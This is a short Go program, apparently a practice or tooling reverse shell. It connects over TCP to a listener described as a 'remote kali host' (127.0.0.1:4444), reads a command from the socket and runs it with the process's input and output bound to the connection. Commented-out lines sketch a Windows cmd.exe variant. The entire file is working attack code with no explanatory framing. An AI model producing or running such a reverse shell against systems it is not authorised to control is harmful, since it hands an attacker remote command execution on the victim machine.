package main

import (
	"bufio"
	"log"
	"net"
	"os/exec"
	"strings"
)

func CheckErr(e error) {
	if e != nil {
		log.Fatal("Error %s", e)
	}
}

func main() {
	// start a connection on remote kali host
	conn, err := net.Dial("tcp", "127.0.0.1:4444")
	CheckErr(err)
	// listen for remote commands from server
	remoteCmd, err := bufio.NewReader(conn).ReadString('\n')
	CheckErr(err)
	command := exec.Command(strings.TrimSuffix(remoteCmd, "\n"))

	command.Stdin = conn
	command.Stdout = conn
	command.Stderr = conn
	command.Run()

	// be OS aware
	// switch runtime.GOOS {
	// case "windows":

	// 	//command = exec.Command("cmd.exe")

	// }
	// command.Stdin = conn
	// command.Stdout = conn
	// command.Stderr = conn
	// command.Run()
}
